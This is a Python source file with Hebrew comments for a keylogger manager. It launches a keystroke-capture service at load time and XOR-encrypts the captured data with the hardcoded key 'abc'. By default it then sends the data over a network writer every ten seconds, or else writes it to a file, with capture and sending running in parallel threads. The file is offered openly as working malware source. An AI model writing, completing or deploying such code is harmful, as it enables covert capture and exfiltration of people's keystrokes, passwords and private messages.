from KeyloggerService import *  # ייבוא שירות הקי-לוגר
from FileWriter import *  # ייבוא כותב קבצים
import threading  # ספרייה להפעלת תהליכונים
import time  # ספרייה לניהול זמן
from IEncryptor import *  # ממשק להצפנה
from network_writer import *  # ייבוא כותב רשת
from modules.Encryptor import XOREncryptor  # מחלקת הצפנה בשיטת XOR

class KeyLoggerManager:
    def __init__(self, mode = "network"):
        """
        אתחול מנהל הקי-לוגר:
        - יצירת מופע של KeyloggerService.
        - בחירת שיטת הצפנה (XOR).
        - בחירת מצב עבודה: רשת או קובץ.
        """
        self.instance = KeyloggerService()
        self.encryptor : IEncryptor = XOREncryptor()
        self.mode = mode

        if self.mode == "network":
            self.writer = NetworkWriter()
        else:
            self.writer = FileWriter()

    def start(self):
        """
        הפעלת הקי-לוגר והמתנה כל עוד הוא פעיל.
        """
        self.instance.start()
        while self.instance.return_action():
            True
        return

    def write_data(self):
        """
        איסוף נתונים, הצפנתם, וכתיבתם בהתאם למצב העבודה (רשת/קובץ).
        """
        while self.instance.return_action():
            encrypted_data = self.xor_encryption()
            if self.mode == "network":
                stop_key_logger = self.writer.write(encrypted_data)
                if not stop_key_logger:
                    self.instance.start()
                time.sleep(10)
            else:
                self.writer.write(encrypted_data)
                time.sleep(3)

    def xor_encryption(self):
        """
        הצפנת הנתונים שנאספו עם הצפנת XOR.
        """
        return self.encryptor.encryption(self.instance.get_data(), "abc")

    def main(self):
        """
        הפעלת הקי-לוגר והתחלת כתיבת הנתונים בתהליכונים נפרדים.
        """
        threading.Thread(target=self.start).start()
        time.sleep(0.1)  # השהייה קצרה לפני הפעלת הכתיבה
        threading.Thread(target=self.write_data).start()

A = KeyLoggerManager()
A.main()
